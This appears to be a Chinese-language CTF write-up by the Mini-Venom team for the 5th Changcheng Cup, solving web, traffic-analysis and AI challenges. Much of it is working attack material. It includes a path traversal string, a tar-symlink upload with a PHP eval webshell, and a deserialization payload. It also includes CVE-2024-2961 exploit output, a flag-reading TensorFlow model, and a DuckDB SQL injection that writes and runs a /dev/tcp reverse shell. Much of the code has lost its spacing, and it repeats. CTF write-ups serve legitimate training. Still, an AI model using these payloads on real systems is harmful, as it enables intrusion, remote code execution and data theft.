# 第五届长城杯-京津冀 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/271264.html
> ID: 271264

第五届长城杯-京津冀

Web:

文曲签学

#help获得信息

#hint给出提示如下

caps控制大小写

read ....//....//....//....//....//....//....//flag

EZ_upload

upload.php

<?phphighlight_file(__FILE__);functionhandleFileUpload($file){ $uploadDirectory='/tmp/'; if($file['error'] !== UPLOAD_ERR_OK) { echo'文件上传失败。'; return; } $filename= basename($file['name']); $filename= preg_replace('/[^a-zA-Z0-9_-.]/','_',$filename); if(empty($filename)) { echo'文件名不符合要求。'; return; } $destination=$uploadDirectory.$filename; if(move_uploaded_file($file['tmp_name'],$destination)) { exec('cd /tmp && tar -xvf '.$filename.'&&pwd'); echo$destination; }else{ echo'文件移动失败。'; }}handleFileUpload($_FILES['file']);?>

发现上传文件保存在/tmp文件中，同时会对符合文件名要求的文件进行解压处理，那么很容易就想到使用软连接，首先创建软连接将/tmp指向/var/www/html

ln -s /var/www/html aaatar -cvf aaa.tar aaa

接着写入一句话木马

mkdir -p aaaecho '<?php @eval($_POST["aaa"]);?>' > aaa/aaa.phptar -cvf aaa2.tar aaa/aaa.php

然后蚁剑连接，得到flag

SeRce

利用不完整类使再次反序列化结果不同

https://blog.kengwang.com.cn/archives/599/#%E7%BB%95%E8%BF%87

?exp=O:22:%22__PHP_InComplete_Class%22:2:{s:4:%22name%22;s:8:%22RedHeart%22;s:6:%22nation%22;s:5:%22China%22;}

CVE-2024-2961

https://github.com/kezibei/php-filter-iconv

file协议读取/proc/self/maps 可以找到libc.so.x文件，两个文件读取后保存在本地

/var/www/html下目录不可写 改脚本中的命令

/readflag > /tmp/lier.txt

执行

┌──(env)─(root㉿kali)-[/tool/vulhub/CVE-2024-2961/php-filter-iconv]└─# python php-filter-iconv.py[*]Got 281 memory regions[*]Using 0x7f128e800040 as heap[*]download: /usr/lib/x86_64-linux-gnu/libc.so.6[*]payload:php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXsO%2bJiwjbg674E56n8vy3WxccOPfmSMzBqFPXGxo6GqKL%2bOfFejMxOkmphH2t1fp73vTblti/XnN3hTHgB20GvtUxqfu83m62Oh6WLRmtIs2CX0OCwOUtx0Ofrb5it7o4Z%2bu0ja6bHAlYwWZIohVtRbOv7fDaC9QQdd78wPzkdfH8djU1%2b/NKb13btXb%2b9sx7cu//X%2b1lkzw9dd95fqmJf2wIOOBDffn6wmnTt063i75249ku38vfvmVWPzu4x/be9qjzhetvv7797dun6/v3P/vy8ftr5Z/TGPGa9iB%2b59%2bKvQ1/vj3%2byvTp9nS730HJ1Xe2/X5dVm95fPG89ar7fW%2b/vVxZ8H/L3fnXb14vttqfu/156YYc/a8yp4ujp60XP//%2bdvI%2bu/Rb706X7Y//P%2bN4/2tj%2b/%2bVvvOqdud9qYv9sOeddf7n55%2bvJNtu3v/hjkFPPdCDe/C7iIEneRYswBb3vPkeX9%2bZUk0gTC7IVqfoSK6du9FN0kXlLzt%2bxQusv52IMIqyTu416vD4xY9fsUP5m4kbU7aUHZNKFZj4RR6/4oZ3N5STT2a87TE9paD00p6Ao%2b9udD826eItyewpji6X6gko3pXc36O6eKvxNY3mjiX/CSguOS4n6e2Wnb4mkE3Q8z%2bB4H7RZ2s0refauYjFPEqT/jGPBvRoQJMZ0Ac%2bLItKXvLUr3br%2bbhlGhNzCHix4aHv1mMep%2bf%2bypq/1ydQ6SYbgcA%2bPDurd%2bI0669X7apnLnLZxEuoLjC9arou6HF01ZvpNXc05B%2b1f/qcf/9viJfLDT5CFs16JRW%2b8qOu7Tfv3k8HlQ6VEVAvcS3k%2bg6v3vyXG%2bOzpvCLCdYzAAA=

读取

filetoread=file:///tmp/lier.txt

数据安全:

RealCheckIn-1

在tcp stream 1102 中发现写入的flag

Dockerfile

RealCheckIn-3

使用工具提取出来的txt文件

发现冰蝎加密的流量：

90d1b4d15f7113a53996b0968b9da80d75d494f553758768ed769b0e237c6632f71b98ae2b04

得到key:rc4 key : supernov@

AI:

easy_poison

把文件丢给gpt就行

# make_submission_flipped_final.pyimportosimportreimporttorchimportpandasaspdimportnumpyasnpfromcollectionsimportdefaultdictfromsrc.modelimportTextClassifier, Runfromsrc.parametersimportParametersOUTPUT_DIR ="uploads"OUTPUT_FILE ="submitted_model.pth"TRAIN_FILE ="./data/train_set.csv"# -------------------- 文本处理 --------------------defnormalize_text(text): text = text.lower() text = re.sub(r"[^a-z]+"," ", text) returntext.strip()deftokenize(text): returntext.split()iftextelse[]defbuild_vocab(text_list, max_words): counter = defaultdict(int) fortintext_list: fortokenintokenize(t): counter[token] +=1 most_common = sorted(counter.items(), key=lambdax: -x[1])[:max_words-1] vocab = {w: i+1fori, (w, _)inenumerate(most_common)} returnvocabdefencode_sequence(tokens, vocab, seq_len): seq = [vocab.get(tok,0)fortokintokens] iflen(seq) < seq_len: seq += [0] * (seq_len - len(seq)) else: seq = seq[:seq_len] returnseqdefload_and_prepare_data(max_words, seq_len): ifnotos.path.isfile(TRAIN_FILE): raiseFileNotFoundError(f"找不到训练数据文件:{TRAIN_FILE}") df = pd.read_csv(TRAIN_FILE) text_col ="text"if"text"indf.columnselsedf.columns[0] label_col ="target"if"target"indf.columnselsedf.columns[1] df = df[[text_col, label_col]].dropna(subset=[label_col]) df = df[df[label_col].isin([0,1])] texts = [normalize_text(str(t))fortindf[text_col]] labels = df[label_col].astype(int).tolist() vocab = build_vocab(texts, max_words) sequences = [encode_sequence(tokenize(t), vocab, seq_len)fortintexts] X = np.array(sequences, dtype=np.int64) y = np.array(labels, dtype=np.int64) rng = np.random.default_rng(42) idx = rng.permutation(len(X)) X, y = X[idx], y[idx] split = int(len(X) *0.8) return{ "x_train": X[:split], "y_train": y[:split], "x_test": X[split:], "y_test": y[split:], }# -------------------- 翻转预测包装 --------------------classFlippedPredictor(torch.nn.Module): """ 包装原模型，在预测阶段翻转二分类输出。 不修改模型权重，保证 state_dict 与原模型一致。 """ def__init__(self, model: TextClassifier): super().__init__() self.model = model defforward(self, x): logits = self.model(x) iflogits.shape[1] ==1: return-logits # sigmoid 输出取负 else: flipped = logits.clone()# 两类 logits 交换 flipped[:,0], flipped[:,1] = logits[:,1], logits[:,0] returnflipped# -------------------- 主流程 --------------------defmain(): os.makedirs(OUTPUT_DIR, exist_ok=True) params = Parameters() # 数据准备 data = load_and_prepare_data(params.num_words, params.seq_len) # 模型训练 model = TextClassifier(params) Run().train(model, data, params) model.eval() # 保存原模型权重（服务器加载用） save_path = os.path.join(OUTPUT_DIR, OUTPUT_FILE) torch.save(model.state_dict(), save_path) size_kb = os.path.getsize(save_path)/1024 print(f"[+] 模型权重已保存:{OUTPUT_FILE}({size_kb:.1f}KB) ->{save_path}") # 示例：如何在预测阶段使用翻转 flipped_model = FlippedPredictor(model) # 使用示例： # x = torch.tensor(data["x_test"]) # preds = torch.argmax(flipped_model(x), dim=1)if__name__ =="__main__": main()

Mini-modelscope

importtensorflowastfimportshutilclassEvilModel(tf.Module): @tf.function(input_signature=[tf.TensorSpec(shape=[1,1], dtype=tf.float32)]) defserve(self, x): try: content = tf.io.read_file("/flag") byte_array = tf.strings.unicode_decode(content,'UTF-8') return{"prediction": tf.cast(byte_array, tf.int32)} except: # 防止报错 return{"prediction": tf.constant([0], dtype=tf.int32)}# 保存模型model = EvilModel()tf.saved_model.save(model,"model", signatures={"serve": model.serve})# 打包成 model.zipshutil.make_archive("model","zip","model")print("✅ model.zip 已生成，可以上传")

然后ascill转字符串

ascii_values = [102,108,97,103,123,98,53,101,50,98,51,53,100,45,55,54,50,55,45,52,100,100,49,45,98,51,55,102,45,99,101,52,102,52,49,56,54,49,56,100,56,125]flag ="".join(chr(c)forcinascii_values)print(flag)

大型语言模型数据投毒

数据打包一下丢gpt，

提取safetensors权重

# -*- coding: utf-8 -*-"""Pure-Python Safetensors exporter (no 'safetensors' dependency).功能： - 读取 model.safetensors，逐张量导出为 .npy（或 .bin） - 导出 metadata.json（文件级元数据 + 张量详情 + 可选统计/预览） - 导出 summary.csv注意： - 需要 numpy - 兼容常见 dtype：F16/F32/F64/BF16/I8/I16/I32/I64/U8/U16/U32/U64/BOOL - 对 F8_E4M3FN / F8_E5M2 若 numpy 不支持 float8，则按 uint8 原样导出并在 metadata 里标注说明"""importosimportreimportcsvimportjsonimportmathimportstructimportshutilfromdatetimeimportdatetimefromtqdmimporttqdm # 新增进度条支持importnumpyasnp# ============ 配置（按需修改） ============INPUT_PATH =r'./model.safetensors' # 你的 safetensors 文件OUT_DIR =None # None => 自动用文件名+时间戳EXPORT_FORMAT ='npy' # 'npy' 或 'bin'COMPUTE_STATS =True # 统计 min/max/mean/std（浮点/整型）PEEK =0 # 预览前 N 个扁平元素；0 不预览WRITE_SUMMARY_CSV =True # 是否写 summary.csvOVERWRITE_OUTPUT =False # 是否覆盖已存在的输出目录VERBOSE =False # 是否显示详细日志# ========================================defhuman_bytes(n: int)-> str: """将字节数转换为人类可读的格式""" ifn <0: return"Invalid size" units = ["B","KB","MB","GB","TB"] x = float(n); i =0 whilex >=1024andi < len(units) -1: x /=1024.0; i +=1 returnf"{x:.2f}{units[i]}"defsanitize_name(name: str)-> str: """清理文件名，移除操作系统不允许的字符""" returnre.sub(r'[\/:*?"<>|]',"_", name)deftry_get_np_dtype(dtype_str: str): """ 将 safetensors dtype 映射到 numpy dtype。 返回 (np_dtype, note) - 若无法精确还原（如 float8 未支持），返回 (np.uint8, 'stored_as_uint8') """ s = dtype_str.upper() mapping = { 'F16': np.float16, 'F32': np.float32, 'F64': np.float64, 'I8': np.int8, 'I16': np.int16, 'I32': np.int32, 'I64': np.int64, 'U8': np.uint8, 'U16': np.uint16, 'U32': np.uint32, 'U64': np.uint64, 'BOOL': np.bool_, } ifsinmapping: returnnp.dtype(mapping[s]),None ifs =='BF16': # 尝试 numpy 的 bfloat16（numpy>=2.0 支持） try: returnnp.dtype('bfloat16'),None exceptException: # 退化为 uint16 存储，并在统计时转换到 float32 returnnp.dtype(np.uint16),'bf16_stored_as_uint16' # float8 变体 ifsin('F8_E4M3FN','F8_E5M2','F8E4M3FN','F8E5M2'): # 尝试 numpy float8（2.0+） try: if'E4M3'ins: returnnp.dtype('float8_e4m3fn'),None else: returnnp.dtype('float8_e5m2'),None exceptException: returnnp.dtype(np.uint8),'float8_stored_as_uint8' # 未知类型：原样作为 uint8 returnnp.dtype(np.uint8),f'unknown_dtype_{dtype_str}_stored_as_uint8'defcompute_stats(arr: np.ndarray, logical_dtype_note: str | None): """计算张量的统计信息""" info = {} try: dt = arr.dtype kind = dt.kind # 对存为 uint16 的 BF16，尽量转成 float32 再统计 iflogical_dtype_note =='bf16_stored_as_uint16': u16 = arr.view(np.uint16) f32 = (u16.astype(np.uint32) <<16).view(np.float32) info["min"] = float(np.min(f32)) info["max"] = float(np.max(f32)) info["mean"] = float(np.mean(f32)) info["std"] = float(np.std(f32)) info["computed_on"] ="bf16->float32" returninfo # 对 float8 存为 uint8 的，只能跳过统计（除非你自己提供解码） iflogical_dtype_noteand'float8_stored_as_uint8'inlogical_dtype_note: info["note"] ="stats skipped for float8 stored as uint8" returninfo ifkind =='f': # float a = arr.astype(np.float32, copy=False) info["min"] = float(np.min(a)) info["max"] = float(np.max(a)) info["mean"] = float(np.mean(a)) info["std"] = float(np.std(a)) elifkindin('i','u','b'): info["min"] = int(np.min(arr))ifarr.sizeelse0 info["max"] = int(np.max(arr))ifarr.sizeelse0 elifkind =='c': a = arr.astype(np.complex64, copy=False) info["min_real"] = float(np.min(a.real)) info["max_real"] = float(np.max(a.real)) info["min_imag"] = float(np.min(a.imag)) info["max_imag"] = float(np.max(a.imag)) else: try: a = arr.astype(np.float32) info["min"] = float(np.min(a)) info["max"] = float(np.max(a)) info["mean"] = float(np.mean(a)) info["std"] = float(np.std(a)) exceptException: info["note"] ="stats not supported for dtype" exceptExceptionase: info["error"] =f"{type(e).__name__}:{e}" returninfodefsave_array(arr: np.ndarray, out_base: str, fmt: str, logical_dtype_note: str | None): """保存数组到文件""" # 确保目录存在 os.makedirs(os.path.dirname(out_base), exist_ok=True) iffmt =='npy': np.save(out_base +'.npy', arr) eliffmt =='bin': withopen(out_base +'.bin','wb')asf: f.write(arr.tobytes(order='C')) withopen(out_base +'.shape_dtype.txt','w', encoding='utf-8')asf: f.write(f"dtype:{arr.dtype}n") f.write(f"shape:{list(arr.shape)}n") f.write("order: Cn") iflogical_dtype_note: f.write(f"note:{logical_dtype_note}n") else: raiseValueError("Unknown format: "+ fmt)defexport_all(): """主导出函数""" safepath = INPUT_PATH ifnotos.path.isfile(safepath): raiseFileNotFoundError(f"File not found:{safepath}") ts = datetime.now().strftime("%Y%m%d_%H%M%S") out_dir = OUT_DIR ifout_dirisNone: base = os.path.splitext(os.path.basename(safepath))[0] out_dir =f"dump_{base}_{ts}" # 处理输出目录 ifos.path.exists(out_dir): ifOVERWRITE_OUTPUT: ifVERBOSE: print(f"[!] Overwriting existing directory:{out_dir}") shutil.rmtree(out_dir) else: raiseFileExistsError(f"Output directory exists:{out_dir}. Set OVERWRITE_OUTPUT=True to overwrite.") os.makedirs(out_dir, exist_ok=True) ifVERBOSE: print(f"[+] Output will be saved to:{os.path.abspath(out_dir)}") print(f"[+] Opening:{safepath}") try: withopen(safepath,'rb')asf: # 1) 读取 8 字节小端无符号整数：header 长度 hdr_len_bytes = f.read(8) iflen(hdr_len_bytes) !=8: raiseValueError("File too short: cannot read 8-byte header length") (hdr_len,) = struct.unpack('<Q', hdr_len_bytes) # 2) 读取 JSON header header_bytes = f.read(hdr_len) iflen(header_bytes) != hdr_len: raiseValueError("File too short: header truncated") try: header = json.loads(header_bytes.decode('utf-8')) exceptExceptionase: raiseValueError(f"Invalid JSON header:{e}") # 顶层元数据通常存放在 __metadata__（也可能是 'metadata'） file_metadata = header.get('__metadata__', header.get('metadata',None)) # 3) 数据区基址（紧随 header 之后） data_base =8+ hdr_len # 4) 收集所有张量条目（除去 __metadata__） tensor_entries = {k: vfork, vinheader.items()ifknotin('__metadata__','metadata')} print(f"[+] Found{len(tensor_entries)}tensors") rows = [] meta_out = { "source_file": os.path.abspath(safepath), "export_time": ts, "tensors": [], "file_metadata": file_metadata, "notes": [ "data_offsets are relative to the start of the data blob (immediately after the JSON header).", "All arrays are saved in C-order." ] } total_nbytes =0 errors = [] # 使用 tqdm 显示进度条 forname, descintqdm(tensor_entries.items(), total=len(tensor_entries), desc="Processing tensors"): try: ifnotall(kindescforkin('dtype','shape','data_offsets')): raiseValueError(f"missing required fields") dtype_str = desc['dtype'] shape = list(desc['shape']) start, end = desc['data_offsets'] ifnot(isinstance(start, int)andisinstance(end, int)andend >= start): raiseValueError(f"bad data_offsets:{desc['data_offsets']}") # 绝对文件偏移 abs_start = data_base + start abs_end = data_base + end size_bytes = abs_end - abs_start # 读出原始字节 f.seek(abs_start,0) raw = f.read(size_bytes) iflen(raw) != size_bytes: raiseValueError(f"data truncated (expected{size_bytes}bytes, got{len(raw)})") # dtype 映射 np_dtype, note = try_get_np_dtype(dtype_str) # 按 dtype 解析为 numpy 数组 itemsize = np_dtype.itemsize ifitemsize ==0: raiseValueError(f"zero itemsize dtype") expected_elems = int(size_bytes // itemsize) shape_prod = np.prod(shape, dtype=np.int64) ifexpected_elems !=0orshape_prod !=0: ifshape_prod != expected_elems: raiseValueError( f"size mismatch: bytes={size_bytes}, " f"dtype={np_dtype}, expected_elems={expected_elems}, shape={shape}" ) arr = np.frombuffer(raw, dtype=np_dtype, count=expected_elems) try: arr = arr.reshape(shape, order='C') exceptException: # 退化处理：若 reshape 失败，保留 1D ifVERBOSE: print(f"[!] Could not reshape tensor{name}to{shape}, keeping as 1D array") nbytes = int(arr.nbytes) total_nbytes += nbytes info = { "name": name, "dtype_in_header": dtype_str, "numpy_dtype_used": str(np_dtype), "shape": shape, "nbytes": nbytes, "human_size": human_bytes(nbytes), } ifnote: info["dtype_note"] = note # 统计 ifCOMPUTE_STATS: info["stats"] = compute_stats(arr, note) # 预览 ifPEEKandarr.size >0: flat = arr.ravel() lim = min(PEEK, flat.size) preview = [] foriinrange(lim): v = flat[i] try: ifarr.dtype.kind =='f': preview.append(float(v)) elifarr.dtype.kindin('i','u'): preview.append(int(v)) elifarr.dtype == np.bool_: preview.append(bool(v)) else: preview.append(v.tolist()ifhasattr(v,'tolist')elserepr(v)) exceptException: preview.append(repr(v)) info['peek'] = preview # 保存 out_base = os.path.join(out_dir, sanitize_name(name)) save_array(arr, out_base, EXPORT_FORMAT, note) rows.append([name, dtype_str, str(np_dtype),"x".join(map(str, shape)), nbytes, human_bytes(nbytes)]) meta_out["tensors"].append(info) ifVERBOSE: print(f" -{name}|{dtype_str}->{np_dtype}|{shape}|{human_bytes(nbytes)}") exceptExceptionase: error_msg =f"Error processing tensor '{name}':{str(e)}" errors.append(error_msg) print(f"n[!]{error_msg}") ifnotVERBOSE: print(" Use VERBOSE=True for more details") # 写 metadata.json meta_path = os.path.join(out_dir,"metadata.json") withopen(meta_path,"w", encoding="utf-8")asfp: json.dump(meta_out, fp, ensure_ascii=False, indent=2) print(f"[+] Saved metadata ->{meta_path}") # 写 summary.csv ifWRITE_SUMMARY_CSV: csv_path = os.path.join(out_dir,"summary.csv") withopen(csv_path,"w", newline="", encoding="utf-8")asfp: writer = csv.writer(fp) writer.writerow(["name","dtype_in_header","numpy_dtype_used","shape","nbytes","human_size"]) writer.writerows(rows) print(f"[+] Saved summary ->{csv_path}") # 记录错误信息 iferrors: error_path = os.path.join(out_dir,"errors.log") withopen(error_path,"w", encoding="utf-8")asfp: fp.write("n".join(errors)) print(f"[!] Encountered{len(errors)}errors. Details saved to{error_path}") print(f"[+] Total tensor bytes:{human_bytes(total_nbytes)}") print(f"[✓] Done. Output dir:{os.path.abspath(out_dir)}") exceptExceptionase: print(f"[!] Fatal error:{str(e)}") ifos.path.exists(out_dir)andlen(os.listdir(out_dir)) ==0: os.rmdir(out_dir) raiseif__name__ =="__main__": try: export_all() exceptExceptionase: print(f"Export failed:{e}") exit(1)

跑验证脚本，得到flag

flag{po2iso3ning_su4cces5sfully_triggered}

eztalk

账号密码

guest guest

然后是sql注入

https://huntr.com/bounties/8ddf66e1-f74c-4d53-992b-76bc45cacac1

test') as score, node_id, text from documents; COPY (SELECT 'sh -i >& /dev/tcp/0.0.0.0/44440>&1') TO '/tmp/exploit'; select concat('0test') as score, node_id, text from documents; install shellfs from community; load shellfs; select * from read_csv('bash /tmp/exploit |'); select concat('0

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析长期招新

欢迎联系admin@chamd5.org


```
read ....//....//....//....//....//....//....//flag
```



```
<?phphighlight_file(__FILE__);functionhandleFileUpload($file){ $uploadDirectory='/tmp/'; if($file['error'] !== UPLOAD_ERR_OK) { echo'文件上传失败。'; return; } $filename= basename($file['name']); $filename= preg_replace('/[^a-zA-Z0-9_-.]/','_',$filename); if(empty($filename)) { echo'文件名不符合要求。'; return; } $destination=$uploadDirectory.$filename; if(move_uploaded_file($file['tmp_name'],$destination)) { exec('cd /tmp && tar -xvf '.$filename.'&&pwd'); echo$destination; }else{ echo'文件移动失败。'; }}handleFileUpload($_FILES['file']);?>
```



```
ln -s /var/www/html aaatar -cvf aaa.tar aaa
```



```
mkdir -p aaaecho '<?php @eval($_POST["aaa"]);?>' > aaa/aaa.phptar -cvf aaa2.tar aaa/aaa.php
```



```
?exp=O:22:%22__PHP_InComplete_Class%22:2:{s:4:%22name%22;s:8:%22RedHeart%22;s:6:%22nation%22;s:5:%22China%22;}
```



```
/readflag > /tmp/lier.txt
```



```
┌──(env)─(root㉿kali)-[/tool/vulhub/CVE-2024-2961/php-filter-iconv]└─# python php-filter-iconv.py[*]Got 281 memory regions[*]Using 0x7f128e800040 as heap[*]download: /usr/lib/x86_64-linux-gnu/libc.so.6[*]payload:php://filter/read=zlib.inflate|zlib.inflate|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.latin1.latin1|dechunk|convert.iconv.UTF-8.ISO-2022-CN-EXT|convert.quoted-printable-decode|convert.iconv.latin1.latin1/resource=data:text/plain;base64,e3vXsO%2bJiwjbg674E56n8vy3WxccOPfmSMzBqFPXGxo6GqKL%2bOfFejMxOkmphH2t1fp73vTblti/XnN3hTHgB20GvtUxqfu83m62Oh6WLRmtIs2CX0OCwOUtx0Ofrb5it7o4Z%2bu0ja6bHAlYwWZIohVtRbOv7fDaC9QQdd78wPzkdfH8djU1%2b/NKb13btXb%2b9sx7cu//X%2b1lkzw9dd95fqmJf2wIOOBDffn6wmnTt063i75249ku38vfvmVWPzu4x/be9qjzhetvv7797dun6/v3P/vy8ftr5Z/TGPGa9iB%2b59%2bKvQ1/vj3%2byvTp9nS730HJ1Xe2/X5dVm95fPG89ar7fW%2b/vVxZ8H/L3fnXb14vttqfu/156YYc/a8yp4ujp60XP//%2bdvI%2bu/Rb706X7Y//P%2bN4/2tj%2b/%2bVvvOqdud9qYv9sOeddf7n55%2bvJNtu3v/hjkFPPdCDe/C7iIEneRYswBb3vPkeX9%2bZUk0gTC7IVqfoSK6du9FN0kXlLzt%2bxQusv52IMIqyTu416vD4xY9fsUP5m4kbU7aUHZNKFZj4RR6/4oZ3N5STT2a87TE9paD00p6Ao%2b9udD826eItyewpji6X6gko3pXc36O6eKvxNY3mjiX/CSguOS4n6e2Wnb4mkE3Q8z%2bB4H7RZ2s0refauYjFPEqT/jGPBvRoQJMZ0Ac%2bLItKXvLUr3br%2bbhlGhNzCHix4aHv1mMep%2bf%2bypq/1ydQ6SYbgcA%2bPDurd%2bI0669X7apnLnLZxEuoLjC9arou6HF01ZvpNXc05B%2b1f/qcf/9viJfLDT5CFs16JRW%2b8qOu7Tfv3k8HlQ6VEVAvcS3k%2bg6v3vyXG%2bOzpvCLCdYzAAA=
```



```
filetoread=file:///tmp/lier.txt
```



```
90d1b4d15f7113a53996b0968b9da80d75d494f553758768ed769b0e237c6632f71b98ae2b04
```



```
# make_submission_flipped_final.pyimportosimportreimporttorchimportpandasaspdimportnumpyasnpfromcollectionsimportdefaultdictfromsrc.modelimportTextClassifier, Runfromsrc.parametersimportParametersOUTPUT_DIR ="uploads"OUTPUT_FILE ="submitted_model.pth"TRAIN_FILE ="./data/train_set.csv"# -------------------- 文本处理 --------------------defnormalize_text(text): text = text.lower() text = re.sub(r"[^a-z]+"," ", text) returntext.strip()deftokenize(text): returntext.split()iftextelse[]defbuild_vocab(text_list, max_words): counter = defaultdict(int) fortintext_list: fortokenintokenize(t): counter[token] +=1 most_common = sorted(counter.items(), key=lambdax: -x[1])[:max_words-1] vocab = {w: i+1fori, (w, _)inenumerate(most_common)} returnvocabdefencode_sequence(tokens, vocab, seq_len): seq = [vocab.get(tok,0)fortokintokens] iflen(seq) < seq_len: seq += [0] * (seq_len - len(seq)) else: seq = seq[:seq_len] returnseqdefload_and_prepare_data(max_words, seq_len): ifnotos.path.isfile(TRAIN_FILE): raiseFileNotFoundError(f"找不到训练数据文件:{TRAIN_FILE}") df = pd.read_csv(TRAIN_FILE) text_col ="text"if"text"indf.columnselsedf.columns[0] label_col ="target"if"target"indf.columnselsedf.columns[1] df = df[[text_col, label_col]].dropna(subset=[label_col]) df = df[df[label_col].isin([0,1])] texts = [normalize_text(str(t))fortindf[text_col]] labels = df[label_col].astype(int).tolist() vocab = build_vocab(texts, max_words) sequences = [encode_sequence(tokenize(t), vocab, seq_len)fortintexts] X = np.array(sequences, dtype=np.int64) y = np.array(labels, dtype=np.int64) rng = np.random.default_rng(42) idx = rng.permutation(len(X)) X, y = X[idx], y[idx] split = int(len(X) *0.8) return{ "x_train": X[:split], "y_train": y[:split], "x_test": X[split:], "y_test": y[split:], }# -------------------- 翻转预测包装 --------------------classFlippedPredictor(torch.nn.Module): """ 包装原模型，在预测阶段翻转二分类输出。 不修改模型权重，保证 state_dict 与原模型一致。 """ def__init__(self, model: TextClassifier): super().__init__() self.model = model defforward(self, x): logits = self.model(x) iflogits.shape[1] ==1: return-logits # sigmoid 输出取负 else: flipped = logits.clone()# 两类 logits 交换 flipped[:,0], flipped[:,1] = logits[:,1], logits[:,0] returnflipped# -------------------- 主流程 --------------------defmain(): os.makedirs(OUTPUT_DIR, exist_ok=True) params = Parameters() # 数据准备 data = load_and_prepare_data(params.num_words, params.seq_len) # 模型训练 model = TextClassifier(params) Run().train(model, data, params) model.eval() # 保存原模型权重（服务器加载用） save_path = os.path.join(OUTPUT_DIR, OUTPUT_FILE) torch.save(model.state_dict(), save_path) size_kb = os.path.getsize(save_path)/1024 print(f"[+] 模型权重已保存:{OUTPUT_FILE}({size_kb:.1f}KB) ->{save_path}") # 示例：如何在预测阶段使用翻转 flipped_model = FlippedPredictor(model) # 使用示例： # x = torch.tensor(data["x_test"]) # preds = torch.argmax(flipped_model(x), dim=1)if__name__ =="__main__": main()
```



```
importtensorflowastfimportshutilclassEvilModel(tf.Module): @tf.function(input_signature=[tf.TensorSpec(shape=[1,1], dtype=tf.float32)]) defserve(self, x): try: content = tf.io.read_file("/flag") byte_array = tf.strings.unicode_decode(content,'UTF-8') return{"prediction": tf.cast(byte_array, tf.int32)} except: # 防止报错 return{"prediction": tf.constant([0], dtype=tf.int32)}# 保存模型model = EvilModel()tf.saved_model.save(model,"model", signatures={"serve": model.serve})# 打包成 model.zipshutil.make_archive("model","zip","model")print("✅ model.zip 已生成，可以上传")
```



```
ascii_values = [102,108,97,103,123,98,53,101,50,98,51,53,100,45,55,54,50,55,45,52,100,100,49,45,98,51,55,102,45,99,101,52,102,52,49,56,54,49,56,100,56,125]flag ="".join(chr(c)forcinascii_values)print(flag)
```



```
# -*- coding: utf-8 -*-"""Pure-Python Safetensors exporter (no 'safetensors' dependency).功能： - 读取 model.safetensors，逐张量导出为 .npy（或 .bin） - 导出 metadata.json（文件级元数据 + 张量详情 + 可选统计/预览） - 导出 summary.csv注意： - 需要 numpy - 兼容常见 dtype：F16/F32/F64/BF16/I8/I16/I32/I64/U8/U16/U32/U64/BOOL - 对 F8_E4M3FN / F8_E5M2 若 numpy 不支持 float8，则按 uint8 原样导出并在 metadata 里标注说明"""importosimportreimportcsvimportjsonimportmathimportstructimportshutilfromdatetimeimportdatetimefromtqdmimporttqdm # 新增进度条支持importnumpyasnp# ============ 配置（按需修改） ============INPUT_PATH =r'./model.safetensors' # 你的 safetensors 文件OUT_DIR =None # None => 自动用文件名+时间戳EXPORT_FORMAT ='npy' # 'npy' 或 'bin'COMPUTE_STATS =True # 统计 min/max/mean/std（浮点/整型）PEEK =0 # 预览前 N 个扁平元素；0 不预览WRITE_SUMMARY_CSV =True # 是否写 summary.csvOVERWRITE_OUTPUT =False # 是否覆盖已存在的输出目录VERBOSE =False # 是否显示详细日志# ========================================defhuman_bytes(n: int)-> str: """将字节数转换为人类可读的格式""" ifn <0: return"Invalid size" units = ["B","KB","MB","GB","TB"] x = float(n); i =0 whilex >=1024andi < len(units) -1: x /=1024.0; i +=1 returnf"{x:.2f}{units[i]}"defsanitize_name(name: str)-> str: """清理文件名，移除操作系统不允许的字符""" returnre.sub(r'[\/:*?"<>|]',"_", name)deftry_get_np_dtype(dtype_str: str): """ 将 safetensors dtype 映射到 numpy dtype。 返回 (np_dtype, note) - 若无法精确还原（如 float8 未支持），返回 (np.uint8, 'stored_as_uint8') """ s = dtype_str.upper() mapping = { 'F16': np.float16, 'F32': np.float32, 'F64': np.float64, 'I8': np.int8, 'I16': np.int16, 'I32': np.int32, 'I64': np.int64, 'U8': np.uint8, 'U16': np.uint16, 'U32': np.uint32, 'U64': np.uint64, 'BOOL': np.bool_, } ifsinmapping: returnnp.dtype(mapping[s]),None ifs =='BF16': # 尝试 numpy 的 bfloat16（numpy>=2.0 支持） try: returnnp.dtype('bfloat16'),None exceptException: # 退化为 uint16 存储，并在统计时转换到 float32 returnnp.dtype(np.uint16),'bf16_stored_as_uint16' # float8 变体 ifsin('F8_E4M3FN','F8_E5M2','F8E4M3FN','F8E5M2'): # 尝试 numpy float8（2.0+） try: if'E4M3'ins: returnnp.dtype('float8_e4m3fn'),None else: returnnp.dtype('float8_e5m2'),None exceptException: returnnp.dtype(np.uint8),'float8_stored_as_uint8' # 未知类型：原样作为 uint8 returnnp.dtype(np.uint8),f'unknown_dtype_{dtype_str}_stored_as_uint8'defcompute_stats(arr: np.ndarray, logical_dtype_note: str | None): """计算张量的统计信息""" info = {} try: dt = arr.dtype kind = dt.kind # 对存为 uint16 的 BF16，尽量转成 float32 再统计 iflogical_dtype_note =='bf16_stored_as_uint16': u16 = arr.view(np.uint16) f32 = (u16.astype(np.uint32) <<16).view(np.float32) info["min"] = float(np.min(f32)) info["max"] = float(np.max(f32)) info["mean"] = float(np.mean(f32)) info["std"] = float(np.std(f32)) info["computed_on"] ="bf16->float32" returninfo # 对 float8 存为 uint8 的，只能跳过统计（除非你自己提供解码） iflogical_dtype_noteand'float8_stored_as_uint8'inlogical_dtype_note: info["note"] ="stats skipped for float8 stored as uint8" returninfo ifkind =='f': # float a = arr.astype(np.float32, copy=False) info["min"] = float(np.min(a)) info["max"] = float(np.max(a)) info["mean"] = float(np.mean(a)) info["std"] = float(np.std(a)) elifkindin('i','u','b'): info["min"] = int(np.min(arr))ifarr.sizeelse0 info["max"] = int(np.max(arr))ifarr.sizeelse0 elifkind =='c': a = arr.astype(np.complex64, copy=False) info["min_real"] = float(np.min(a.real)) info["max_real"] = float(np.max(a.real)) 